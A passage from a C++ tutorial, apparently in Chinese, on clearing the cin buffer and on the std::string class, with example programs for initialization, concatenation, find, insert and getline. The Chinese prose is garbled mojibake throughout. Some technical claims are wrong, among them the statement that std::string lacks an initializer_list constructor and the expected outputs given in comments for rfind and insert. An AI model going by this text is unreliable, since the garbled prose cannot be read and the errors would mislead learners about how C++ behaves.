ä¸ªå­—ç¬¦ï¼Œæˆ–è€…é‡åˆ°äº† delim åˆ†éš”ç¬¦ï¼ˆå¹¶ä¸¢å¼ƒè¯¥åˆ†éš”ç¬¦ï¼‰ï¼Œä»¥å…ˆåˆ°è€…ä¸ºå‡†ã€‚é€šå¸¸ç”¨äºä¸¢å¼ƒæ¢è¡Œç¬¦ï¼š 123std::cin.ignore(100, &#x27;\\n&#x27;); // è·³è¿‡æœ€å¤š100ä¸ªå­—ç¬¦ï¼Œç›´åˆ°å¹¶åŒ…æ‹¬ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦// æˆ–è€…æ›´ç®€å•åœ°ï¼Œå¦‚æœç¡®å®šåªæœ‰ä¸€ä¸ªæ¢è¡Œç¬¦éœ€è¦ä¸¢å¼ƒ// std::cin.ignore(); // è·³è¿‡ä¸‹ä¸€ä¸ªå­—ç¬¦ (å³æ¢è¡Œç¬¦) ä½¿ç”¨ (cin &gt;&gt; ws): C++11 å¼•å…¥äº† std::ws è¾“å…¥æµæ“çºµç¬¦ï¼Œå®ƒå¯ä»¥è¯»å–å¹¶ä¸¢å¼ƒè¾“å…¥æµå¼€å¤´çš„æ‰€æœ‰ç©ºç™½å­—ç¬¦ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰ã€‚ 1(std::cin &gt;&gt; std::ws).getline(name, 50); ä½¿ç”¨ cin.get() è¯»å–å•ä¸ªå­—ç¬¦: 1std::cin.get(); // è¯»å–å¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ ä¿®æ­£åçš„ç¤ºä¾‹ (ä½¿ç”¨ cin.ignore()): 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;limits&gt; // ä¸ºäº† numeric_limits (æ›´å¥å£®çš„ ignore)int main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // æ¸…é™¤è¾“å…¥ç¼“å†²åŒºï¼Œç‰¹åˆ«æ˜¯æ¢è¡Œç¬¦ std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); // numeric_limits&lt;streamsize&gt;::max() è·å–æµèƒ½å¤„ç†çš„æœ€å¤§å­—ç¬¦æ•°ï¼Œç¡®ä¿æ¸…é™¤æ•´è¡Œ std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(name, 50); // ç°åœ¨å¯ä»¥æ­£ç¡®è¯»å–å§“å std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; return 0;&#125; ä¿®æ­£åçš„ç¤ºä¾‹ (ä½¿ç”¨ ws): 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;ios&gt; // ä¸ºäº† wsint main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; std::cout &lt;&lt; &quot;Enter your full name: &quot;; // åœ¨ getline ä¹‹å‰ä½¿ç”¨ ws è·³è¿‡ç©ºç™½ç¬¦ (std::cin &gt;&gt; std::ws).getline(name, 50); std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; return 0;&#125; æ€»ç»“: æ··åˆè¾“å…¥æ•°å­—å’Œæ•´è¡Œå­—ç¬¦ä¸²æ—¶ï¼ŒåŠ¡å¿…è®°å¾—åœ¨ cin &gt;&gt; number; ä¹‹åã€è°ƒç”¨ getline() æˆ– get() ä¹‹å‰ï¼Œæ¸…é™¤è¾“å…¥ç¼“å†²åŒºä¸­æ®‹ç•™çš„æ¢è¡Œç¬¦ã€‚ä½¿ç”¨ cin.ignore() æˆ– (cin &gt;&gt; ws) æ˜¯æ¨èçš„åšæ³•ã€‚ 4.3 stringç±»ç®€ä»‹è™½ç„¶ C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰åœ¨ C++ ä¸­ä»ç„¶å¯ç”¨ï¼Œä½† C++ æ ‡å‡†åº“æä¾›äº†ä¸€ä¸ªæ›´å¼ºå¤§ã€æ›´æ–¹ä¾¿ã€æ›´å®‰å…¨çš„æ›¿ä»£å“ï¼šstd::string ç±»ã€‚ string ç±»æ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå°è£…äº†å­—ç¬¦åºåˆ—çš„æ“ä½œï¼Œæä¾›äº†è‡ªåŠ¨å†…å­˜ç®¡ç†å’Œä¸°å¯Œçš„æˆå‘˜å‡½æ•°æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨ string ç±»ï¼Œéœ€è¦åŒ…å« &lt;string&gt; å¤´æ–‡ä»¶ã€‚ åŸºæœ¬æ¦‚å¿µ: å¯¹è±¡: string ç±»å‹çš„å˜é‡æ˜¯**å¯¹è±¡ (Object)**ã€‚å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ã€‚ è‡ªåŠ¨å†…å­˜ç®¡ç†: ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼ˆç¡®ä¿æ•°ç»„è¶³å¤Ÿå¤§ï¼Œå¤„ç†ç©ºå­—ç¬¦ï¼‰çš„ C é£æ ¼å­—ç¬¦ä¸²ä¸åŒï¼Œstring å¯¹è±¡ä¼šè‡ªåŠ¨å¤„ç†å†…å­˜åˆ†é…å’Œé‡Šæ”¾ã€‚å®ƒå¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€å¢é•¿æˆ–ç¼©å°ã€‚ æˆå‘˜å‡½æ•°: string ç±»æä¾›äº†è®¸å¤šå†…ç½®çš„æ“ä½œï¼ˆæˆå‘˜å‡½æ•°ï¼‰ï¼Œå¦‚è·å–é•¿åº¦ã€æ‹¼æ¥ã€æŸ¥æ‰¾ã€æ›¿æ¢ç­‰ï¼Œä½¿å¾—å­—ç¬¦ä¸²å¤„ç†æ›´åŠ å®¹æ˜“ã€‚ åŸºæœ¬ç”¨æ³•: 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt; // å¿…é¡»åŒ…å« string å¤´æ–‡ä»¶int main() &#123; // å£°æ˜ string å¯¹è±¡ std::string s1; // åˆ›å»ºä¸€ä¸ªç©ºå­—ç¬¦ä¸² std::string s2 = &quot;Hello&quot;; // ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ– std::string s3(&quot;World&quot;); // ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ– (æ„é€ å‡½æ•°è¯­æ³•) std::string s4 = s2; // ä½¿ç”¨å¦ä¸€ä¸ª string å¯¹è±¡åˆå§‹åŒ– (å¤åˆ¶) std::cout &lt;&lt; &quot;s1: &quot; &lt;&lt; s1 &lt;&lt; std::endl; // è¾“å‡ºç©ºè¡Œ std::cout &lt;&lt; &quot;s2: &quot; &lt;&lt; s2 &lt;&lt; std::endl; // è¾“å‡º Hello std::cout &lt;&lt; &quot;s3: &quot; &lt;&lt; s3 &lt;&lt; std::endl; // è¾“å‡º World std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; // è¾“å‡º Hello // string å¯¹è±¡å¯ä»¥åƒæ™®é€šå˜é‡ä¸€æ ·ä½¿ç”¨ std::string message = s2 + &quot;, &quot; + s3 + &quot;!&quot;; // å­—ç¬¦ä¸²æ‹¼æ¥ std::cout &lt;&lt; &quot;Message: &quot; &lt;&lt; message &lt;&lt; std::endl; // è¾“å‡º Hello, World! return 0;&#125; 4.3.1 C++11å­—ç¬¦ä¸²åˆå§‹åŒ–C++11 å¼•å…¥çš„åˆ—è¡¨åˆå§‹åŒ–ï¼ˆèŠ±æ‹¬å·åˆå§‹åŒ–ï¼‰ä¹Ÿå¯ä»¥ç”¨äº string å¯¹è±¡ï¼Œå…¶è¡Œä¸ºç±»ä¼¼äºä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼è¿›è¡Œåˆå§‹åŒ–ã€‚ è¯­æ³•: 123456#include &lt;string&gt;std::string str1 &#123; &quot;Initialized with braces&quot; &#125;; // ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼std::string str2 = &#123; &quot;Also works with =&quot; &#125;; // std::string str3 &#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; &#125;; // C++11 ä¸­é€šå¸¸ä¸ç›´æ¥ç”¨å­—ç¬¦åˆ—è¡¨åˆå§‹åŒ– string (ä¼šå°è¯•è°ƒç”¨åŒ¹é…çš„æ„é€ å‡½æ•°)// std::string str4 = &#123; &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; &#125;; // åŒä¸Š æ³¨æ„: ç›´æ¥ä½¿ç”¨å­—ç¬¦åˆ—è¡¨ &#123; &#39;a&#39;, &#39;b&#39;, &#39;c&#39; &#125; æ¥åˆå§‹åŒ– std::string åœ¨ C++11/14 ä¸­é€šå¸¸ä¸ä¼šæŒ‰é¢„æœŸå·¥ä½œï¼Œå› ä¸ºå®ƒä¼šå°è¯•æŸ¥æ‰¾æ¥å— std::initializer_list&lt;char&gt; çš„æ„é€ å‡½æ•°ï¼Œè€Œæ ‡å‡† std::string æ²¡æœ‰è¿™æ ·çš„æ„é€ å‡½æ•°ã€‚å®ƒé€šå¸¸ä¼šè¢«è§£é‡Šä¸ºå°è¯•è°ƒç”¨æ¥å— C é£æ ¼å­—ç¬¦ä¸² ( const char* ) çš„æ„é€ å‡½æ•°ï¼Œä½†è¿™éœ€è¦åˆ—è¡¨æ°å¥½èƒ½å½¢æˆä¸€ä¸ªæœ‰æ•ˆçš„ C é£æ ¼å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å« \\0ï¼‰ã€‚ æœ€å¸¸ç”¨å’Œæ¸…æ™°çš„åˆå§‹åŒ–æ–¹å¼ä»ç„¶æ˜¯ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢å€¼æˆ–å¦ä¸€ä¸ª string å¯¹è±¡ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string greeting1 &#123; &quot;Good morning&quot; &#125;; std::string greeting2 = &#123; &quot;Good afternoon&quot; &#125;; // std::string letters &#123; &#x27;H&#x27;, &#x27;i&#x27;, &#x27;\\0&#x27; &#125;; // å¯èƒ½ä¸æŒ‰é¢„æœŸå·¥ä½œæˆ–ç¼–è¯‘é”™è¯¯ std::cout &lt;&lt; greeting1 &lt;&lt; std::endl; // è¾“å‡º Good morning std::cout &lt;&lt; greeting2 &lt;&lt; std::endl; // è¾“å‡º Good afternoon // æ¨èçš„åˆå§‹åŒ–æ–¹å¼ std::string s1 = &quot;Hello&quot;; // C é£æ ¼å­—é¢å€¼ std::string s2(&quot;World&quot;); // æ„é€ å‡½æ•°è¯­æ³• std::string s3 = s1; // å¤åˆ¶æ„é€  std::string s4(10, &#x27;c&#x27;); // åˆ›å»ºåŒ…å« 10 ä¸ª &#x27;c&#x27; çš„å­—ç¬¦ä¸² &quot;cccccccccc&quot; std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; return 0;&#125; 4.3.2 èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ string ç±»é‡è½½äº†å¸¸è§çš„è¿ç®—ç¬¦ï¼Œä½¿å¾—èµ‹å€¼ã€æ‹¼æ¥å’Œé™„åŠ æ“ä½œéå¸¸ç›´è§‚ã€‚ èµ‹å€¼ (=): å¯ä»¥å°†ä¸€ä¸ª string å¯¹è±¡ã€ä¸€ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼æˆ–ä¸€ä¸ª char èµ‹ç»™ä¸€ä¸ª string å¯¹è±¡ã€‚ æ‹¼æ¥ (+): å¯ä»¥ä½¿ç”¨ + è¿ç®—ç¬¦å°†ä¸¤ä¸ª string å¯¹è±¡ã€string å¯¹è±¡å’Œ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼ã€æˆ–è€… string å¯¹è±¡å’Œ char æ‹¼æ¥èµ·æ¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ string å¯¹è±¡ã€‚æ³¨æ„ï¼šä¸èƒ½ç›´æ¥æ‹¼æ¥ä¸¤ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°éœ€è¦æ˜¯ string å¯¹è±¡ã€‚ é™„åŠ  (+=): å¯ä»¥ä½¿ç”¨ += è¿ç®—ç¬¦å°†ä¸€ä¸ª string å¯¹è±¡ã€ä¸€ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼æˆ–ä¸€ä¸ª char é™„åŠ åˆ°ç°æœ‰ string å¯¹è±¡çš„æœ«å°¾ï¼ˆä¿®æ”¹åŸå­—ç¬¦ä¸²ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string s1 = &quot;Hello&quot;; std::string s2 = &quot;World&quot;; std::string s3; std::string s4; // èµ‹å€¼ s3 = s1; // s3 å˜ä¸º &quot;Hello&quot; std::cout &lt;&lt; &quot;s3 after assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; s3 = &quot;Goodbye&quot;; // s3 å˜ä¸º &quot;Goodbye&quot; std::cout &lt;&lt; &quot;s3 after new assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; s3 = &#x27;X&#x27;; // s3 å˜ä¸º &quot;X&quot; std::cout &lt;&lt; &quot;s3 after char assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; // æ‹¼æ¥ (+) - åˆ›å»ºæ–°å­—ç¬¦ä¸² s4 = s1 + &quot; &quot; + s2 + &quot;!&quot;; // s4 å˜ä¸º &quot;Hello World!&quot; std::cout &lt;&lt; &quot;s4 (concatenated): &quot; &lt;&lt; s4 &lt;&lt; std::endl; std::string s5 = s1 + &#x27;!&#x27;; // s5 å˜ä¸º &quot;Hello!&quot; std::cout &lt;&lt; &quot;s5 (string + char): &quot; &lt;&lt; s5 &lt;&lt; std::endl; // é”™è¯¯: ä¸èƒ½ç›´æ¥æ‹¼æ¥ä¸¤ä¸ª C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼ // std::string error_str = &quot;String1&quot; + &quot;String2&quot;; // ç¼–è¯‘é”™è¯¯! // æ­£ç¡®: è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯ string å¯¹è±¡ std::string ok_str1 = s1 + &quot; String2&quot;; std::string ok_str2 = &quot;String1&quot; + s2; std::cout &lt;&lt; &quot;ok_str1: &quot; &lt;&lt; ok_str1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;ok_str2: &quot; &lt;&lt; ok_str2 &lt;&lt; std::endl; // é™„åŠ  (+=) - ä¿®æ”¹åŸå­—ç¬¦ä¸² s1 += &quot; &quot;; // s1 å˜ä¸º &quot;Hello &quot; s1 += s2; // s1 å˜ä¸º &quot;Hello World&quot; s1 += &#x27;!&#x27;; // s1 å˜ä¸º &quot;Hello World!&quot; std::cout &lt;&lt; &quot;s1 after append: &quot; &lt;&lt; s1 &lt;&lt; std::endl; return 0;&#125; 4.3.3 stringç±»çš„å…¶ä»–æ“ä½œstring ç±»æä¾›äº†å¤§é‡æˆå‘˜å‡½æ•°æ¥æ‰§è¡Œå„ç§å­—ç¬¦ä¸²æ“ä½œã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„æ“ä½œï¼š è·å–é•¿åº¦/å¤§å°: size() æˆ– length(): è¿”å›å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°ï¼ˆä¸¤è€…åŠŸèƒ½ç›¸åŒï¼‰ã€‚ æ£€æŸ¥æ˜¯å¦ä¸ºç©º: empty(): å¦‚æœå­—ç¬¦ä¸²ä¸ºç©ºï¼Œè¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ è®¿é—®å­—ç¬¦: [] è¿ç®—ç¬¦: åƒæ•°ç»„ä¸€æ ·é€šè¿‡ç´¢å¼•è®¿é—®å­—ç¬¦ï¼ˆä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼‰ã€‚ at(): é€šè¿‡ç´¢å¼•è®¿é—®å­—ç¬¦ï¼ˆè¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œå¦‚æœè¶Šç•Œä¼šæŠ›å‡º std::out_of_range å¼‚å¸¸ï¼‰ã€‚ æŸ¥æ‰¾: find(): æŸ¥æ‰¾å­å­—ç¬¦ä¸²æˆ–å­—ç¬¦é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å›ç´¢å¼•ï¼›å¦‚æœæœªæ‰¾åˆ°ï¼Œè¿”å› std::string::npos (ä¸€ä¸ªç‰¹æ®Šçš„é™æ€æˆå‘˜å¸¸é‡)ã€‚ rfind(): ä»åå‘å‰æŸ¥æ‰¾ã€‚ find_first_of(), find_last_of(), find_first_not_of(), find_last_not_of(): æŸ¥æ‰¾å­—ç¬¦é›†ä¸­çš„ä»»æ„å­—ç¬¦æˆ–éä»»æ„å­—ç¬¦ã€‚ å­å­—ç¬¦ä¸²: substr(pos, count): è¿”å›ä»ä½ç½® pos å¼€å§‹ï¼Œé•¿åº¦ä¸º count çš„å­å­—ç¬¦ä¸²ã€‚ æ¯”è¾ƒ: compare(): æ¯”è¾ƒå­—ç¬¦ä¸²ï¼ˆå­—å…¸åºï¼‰ï¼Œè¿”å›è´Ÿæ•°ã€é›¶æˆ–æ­£æ•°ã€‚ é‡è½½çš„å…³ç³»è¿ç®—ç¬¦ (==, !=, &lt;, &gt;, &lt;=, &gt;=): å¯ä»¥ç›´æ¥æ¯”è¾ƒ string å¯¹è±¡ã€‚ ä¿®æ”¹: insert(): åœ¨æŒ‡å®šä½ç½®æ’å…¥å­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚ erase(): åˆ é™¤æŒ‡å®šä½ç½®å’Œæ•°é‡çš„å­—ç¬¦ã€‚ replace(): æ›¿æ¢æŒ‡å®šèŒƒå›´çš„å­—ç¬¦ã€‚ clear(): æ¸…ç©ºå­—ç¬¦ä¸²ã€‚ append(): ç­‰åŒäº +=ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;stdexcept&gt; // ä¸ºäº† std::out_of_rangeint main() &#123; std::string text = &quot;Hello C++ World!&quot;; // é•¿åº¦å’Œç©ºæ£€æŸ¥ std::cout &lt;&lt; &quot;Text: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; text.length() &lt;&lt; std::endl; // è¾“å‡º 16 std::cout &lt;&lt; &quot;Is empty? &quot; &lt;&lt; std::boolalpha &lt;&lt; text.empty() &lt;&lt; std::endl; // è¾“å‡º false // è®¿é—®å­—ç¬¦ std::cout &lt;&lt; &quot;First char (operator[]): &quot; &lt;&lt; text[0] &lt;&lt; std::endl; // è¾“å‡º H std::cout &lt;&lt; &quot;Fifth char (at()): &quot; &lt;&lt; text.at(4) &lt;&lt; std::endl; // è¾“å‡º o // std::cout &lt;&lt; text.at(20); // ä¼šæŠ›å‡º std::out_of_range å¼‚å¸¸ // æŸ¥æ‰¾ size_t pos_cpp = text.find(&quot;C++&quot;); if (pos_cpp != std::string::npos) &#123; std::cout &lt;&lt; &quot;\\&quot;C++\\&quot; found at index: &quot; &lt;&lt; pos_cpp &lt;&lt; std::endl; // è¾“å‡º 6 &#125; else &#123; std::cout &lt;&lt; &quot;\\&quot;C++\\&quot; not found.&quot; &lt;&lt; std::endl; &#125; size_t pos_l = text.find(&#x27;l&#x27;); // æŸ¥æ‰¾ç¬¬ä¸€ä¸ª &#x27;l&#x27; std::cout &lt;&lt; &quot;First &#x27;l&#x27; found at index: &quot; &lt;&lt; pos_l &lt;&lt; std::endl; // è¾“å‡º 2 size_t pos_last_l = text.rfind(&#x27;l&#x27;); // æŸ¥æ‰¾æœ€åä¸€ä¸ª &#x27;l&#x27; std::cout &lt;&lt; &quot;Last &#x27;l&#x27; found at index: &quot; &lt;&lt; pos_last_l &lt;&lt; std::endl; // è¾“å‡º 12 // å­å­—ç¬¦ä¸² std::string sub = text.substr(6, 3); // ä»ç´¢å¼• 6 å¼€å§‹ï¼Œå– 3 ä¸ªå­—ç¬¦ std::cout &lt;&lt; &quot;Substring (6, 3): \\&quot;&quot; &lt;&lt; sub &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // è¾“å‡º &quot;C++&quot; // æ¯”è¾ƒ std::string s1 = &quot;apple&quot;; std::string s2 = &quot;apply&quot;; if (s1 &lt; s2) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; s1 &lt;&lt; &quot;\\&quot; comes before \\&quot;&quot; &lt;&lt; s2 &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; &#125; int cmp_result = s1.compare(s2); // è¿”å›è´Ÿæ•°ï¼Œå› ä¸º &quot;apple&quot; &lt; &quot;apply&quot; std::cout &lt;&lt; &quot;Compare result: &quot; &lt;&lt; cmp_result &lt;&lt; std::endl; // ä¿®æ”¹ text.insert(10, &quot; beautiful&quot;); // åœ¨ç´¢å¼• 10 å¤„æ’å…¥ std::cout &lt;&lt; &quot;After insert: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // è¾“å‡º &quot;Hello C++ beautiful World!&quot; text.erase(6, 4); // ä»ç´¢å¼• 6 å¼€å§‹ï¼Œåˆ é™¤ 4 ä¸ªå­—ç¬¦ (&quot;C++ &quot;) std::cout &lt;&lt; &quot;After erase: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // è¾“å‡º &quot;Hello beautiful World!&quot; text.replace(6, 9, &quot;gorgeous&quot;); // ä»ç´¢å¼• 6 å¼€å§‹ï¼Œæ›¿æ¢ 9 ä¸ªå­—ç¬¦ (&quot;beautiful&quot;) std::cout &lt;&lt; &quot;After replace: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // è¾“å‡º &quot;Hello gorgeous World!&quot; text.clear(); // æ¸…ç©ºå­—ç¬¦ä¸² std::cout &lt;&lt; &quot;After clear, is empty? &quot; &lt;&lt; std::boolalpha &lt;&lt; text.empty() &lt;&lt; std::endl; // è¾“å‡º true return 0;&#125; 4.3.4 stringç±»I/Oå¯ä»¥ä½¿ç”¨æ ‡å‡†çš„è¾“å…¥è¾“å‡ºæµå¯¹è±¡ cin å’Œ cout æ¥æ–¹ä¾¿åœ°è¯»å†™ string å¯¹è±¡ã€‚ è¾“å‡º (cout &lt;&lt;): &lt;&lt; è¿ç®—ç¬¦è¢«é‡è½½ï¼Œå¯ä»¥ç›´æ¥å°† string å¯¹è±¡è¾“å‡ºåˆ° coutã€‚ è¾“å…¥ (cin &gt;&gt;): &gt;&gt; è¿ç®—ç¬¦è¢«é‡è½½ï¼Œå¯ä»¥ä» cin è¯»å–ä¸€ä¸ªå•è¯ï¼ˆä»¥ç©ºç™½ç¬¦â€”â€”ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦åˆ†éš”ï¼‰åˆ° string å¯¹è±¡ä¸­ã€‚å®ƒä¼šè‡ªåŠ¨è·³è¿‡å¼€å¤´çš„ç©ºç™½ç¬¦ï¼Œç„¶ååœ¨é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½ç¬¦æ—¶åœæ­¢è¯»å–ã€‚ è¯»å–æ•´è¡Œ (getline()): å¦‚æœéœ€è¦è¯»å–åŒ…å«ç©ºæ ¼çš„æ•´è¡Œæ–‡æœ¬ï¼Œåº”è¯¥ä½¿ç”¨ getline() å‡½æ•°ï¼ˆè¿™æ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œä¸æ˜¯ string çš„æˆå‘˜å‡½æ•°ï¼‰ã€‚ getline(cin, str): ä» cin è¯»å–ä¸€è¡Œï¼ˆç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ \\nï¼‰ï¼Œå¹¶å°†å†…å®¹ï¼ˆä¸åŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰å­˜å‚¨åˆ° string å¯¹è±¡ str ä¸­ã€‚ getline(cin, str, delimiter): è¯»å–ç›´åˆ°é‡åˆ°æŒ‡å®šçš„ delimiter å­—ç¬¦ä¸ºæ­¢ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string word1, word2; std::string line; // è¾“å‡º std::string message = &quot;Enter two words:&quot;; std::cout &lt;&lt; message &lt;&lt; std::endl; // è¾“å…¥ (cin &gt;&gt; è¯»å–å•è¯) std::cin &gt;&gt; word1 &gt;&gt; word2; // è¾“å…¥ &quot;Hello World&quot; (ç”¨ç©ºæ ¼éš”å¼€) std::cout &lt;&lt; &quot;Word 1: &quot; &lt;&lt; word1 &lt;&lt; std::endl; // è¾“å‡º Hello std::cout &lt;&lt; &quot;Word 2: &quot; &lt;&lt; word2 &lt;&lt; std::endl; // è¾“å‡º World // æ¸…é™¤è¾“å…¥ç¼“å†²åŒºä¸­å¯èƒ½æ®‹ç•™çš„æ¢è¡Œç¬¦ (cin &gt;&gt; ä¹‹åé€šå¸¸éœ€è¦) std::cin.ignore(10000, &#x27;\\n&#x27;); // è¾“å…¥ (getline è¯»å–æ•´è¡Œ) std::cout &lt;&lt; &quot;Enter a line of text: &quot;; getline(std::cin, line); // è¾“å…¥ &quot;This is a test line.&quot; std::cout &lt;&lt; &quot;You entered: \\&quot;&quot; &lt;&lt; line &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // è¾“å‡º &quot;This is a test line.&quot; return 0;&#125; æ³¨æ„: åœ¨æ··åˆä½¿ç”¨ cin &gt;&gt; å’Œ getline(cin, ...) æ—¶è¦ç‰¹åˆ«å°å¿ƒã€‚cin &gt;&gt; è¯»å–å•è¯åï¼Œä¼šå°†æ¢è¡Œç¬¦ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚å¦‚æœç´§æ¥ç€è°ƒç”¨ getline()ï¼Œå®ƒä¼šç«‹å³è¯»åˆ°è¿™ä¸ªæ¢è¡Œç¬¦å¹¶è®¤ä¸ºè¯»å–ç»“æŸï¼Œå¯¼è‡´å¾—åˆ°ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚é€šå¸¸éœ€è¦åœ¨ cin &gt;&gt; ä¹‹åã€getline() ä¹‹å‰æ¸…é™¤ç¼“å†²åŒºä¸­çš„æ¢è¡Œç¬¦ï¼Œä¾‹å¦‚ä½¿ç”¨ std::cin.ignore()ã€‚ 4.3.5 å…¶ä»–å½¢å¼çš„å­—ç¬¦ä¸²å­—é¢å€¼C++11 å¼•å…¥äº†æ–°çš„å­—ç¬¦ä¸²å­—é¢å€¼å½¢å¼ï¼Œæä¾›äº†å¯¹ä¸åŒå­—ç¬¦ç¼–ç ï¼ˆå¦‚ Unicodeï¼‰çš„æ›´å¥½æ”¯æŒã€‚ åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼ (Raw String Literal): è¯­æ³•: R&quot;delimiter(raw_characters)delimiter&quot; delimiter æ˜¯ä¸€ä¸ªå¯é€‰çš„ã€æœ€å¤š16ä¸ªå­—ç¬¦çš„åºåˆ—ï¼ˆä¸èƒ½åŒ…å«ç©ºæ ¼ã€æ‹¬å·ã€åæ–œæ ï¼‰ã€‚ raw_characters æ˜¯å­—ç¬¦ä¸²å†…å®¹ï¼Œå…¶ä¸­çš„åæ–œæ  \\ å’Œå¼•å· &quot; ç­‰ç‰¹æ®Šå­—ç¬¦ä¸ä¼šè¢«è½¬ä¹‰ï¼ŒæŒ‰åŸæ ·è§£é‡Šã€‚ ä¸»è¦ç”¨äºä¹¦å†™åŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå¦‚æ­£åˆ™è¡¨è¾¾å¼ã€æ–‡ä»¶è·¯å¾„ã€HTML/XMLä»£ç ç­‰ï¼Œé¿å…å¤§é‡çš„åæ–œæ è½¬ä¹‰ã€‚ ç¤ºä¾‹: R&quot;(C:\\Program Files\\)&quot;, R&quot;delimiter(String with &quot;quotes&quot; and \\backslashes)delimiter&quot; Unicode å­—ç¬¦ä¸²å­—é¢å€¼: u8&quot;string&quot;: UTF-8 ç¼–ç çš„å­—ç¬¦ä¸² (ç±»å‹æ˜¯ const char[]ï¼Œä½†åº”å­˜å‚¨åœ¨ std::string æˆ–å¤„ç† UTF-8 çš„åœ°æ–¹)ã€‚ u&quot;string&quot;: UTF-16 ç¼–ç çš„å­—ç¬¦ä¸² (ç±»å‹æ˜¯ const char16_t[])ã€‚ U&quot;string&quot;: UTF-32 ç¼–ç çš„å­—ç¬¦ä¸² (ç±»å‹æ˜¯ const char32_t[])ã€‚ 